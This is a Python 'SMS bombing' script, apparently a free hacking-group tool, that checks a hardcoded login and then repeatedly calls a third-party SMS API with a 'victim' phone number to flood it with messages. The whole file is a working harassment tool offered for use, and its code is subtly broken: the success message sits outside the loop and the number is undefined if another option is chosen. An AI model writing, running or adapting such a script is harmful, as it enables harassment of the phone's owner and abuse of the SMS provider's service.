import os,sys,time,datetime
import requests
bl="\33[94m"
re="\033[91m"
li="\033[94m"
w="\33[97m"
y="\33[93m"
g="\033[1;32m"
cy="\033[96m"
end="\033[0m"

os.system('clear')
info=""" ===========================================
   [•]Created by FARHAN TANZIM SAGOR 
  ==================================================
"""
os.system("lolcat 002.txt")
print(g+info)

a='SAGOR'
b='BCZ'

c=str(input(y+"Enter Username: "))
print("  ")
d=str(input(y+"Enter Password: "))

if a==c and b==d:
  print(g+"Successfully login [√]")
  time.sleep(2)
  os.system('clear')
  
  pass 

else:
  print(re+"[×] Wrong Username or Password try agin ")
  sys.exit()


logo =                                          ("""
\033[1;32m       ██████╗  ██████  ███████╗
\033[1;35m       ██╔══██╗██╔════╝╚══ ███╔╝
\033[1;35m       ██████╔╝██║        ███╔╝
\033[1;32m       ██╔══██╗█        ███╔╝
\033[1;32m       ██████╔╚██████ ╗ ███████╗                                              
\033[1;35m       ╚═════╝  ╚═════╝  ╚══════╝

\033[1;37m================= \33[32;45mSAGOR\33[0;m ==================
       \33[37;41m\t WELLCOME TO BCZ TOOL\33[0;m
\033[1;32m     \033[1;36mFACEBOK      : \033[1;36mFarhan Tanzim Sagor
\033[1;32m     \033[1;35mGITHUB       : \033[1;35mSagor-BCZ
\033[1;32m     \033[1;36mTOOL STATUS  : \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mTEAM         : \033[1;35mBD Cyber Zone-BCZ
\033[1;32m     \033[1;36mTOOL VIRSION   \033[1;36m2.3
\033[1;37m================== \33[32;45mBCZ\33[0;m ====================\n""")
print(cy+logo)

print(w+"["+re+" 1."+w+"]"+g+"START BOMBING  ")
print(g)
print(w+"["+re+" 2."+w+"]"+w+"E"+g+"X"+re+"I"+cy+"T")

inp=str(input("Enter choice: "))
if inp=='1':
  time.sleep(2)
  
  n = str(input(g+"Enter Victim Number"+cy+"(without"+w+" +88  ) :"))
a = int(input(g+"        Enter amount: "))

for i in range (a):
	r= requests.get("http://deepitsolution.in/api.php?number="+n)
print(str(i+1)+" Send Successfully[√]")

 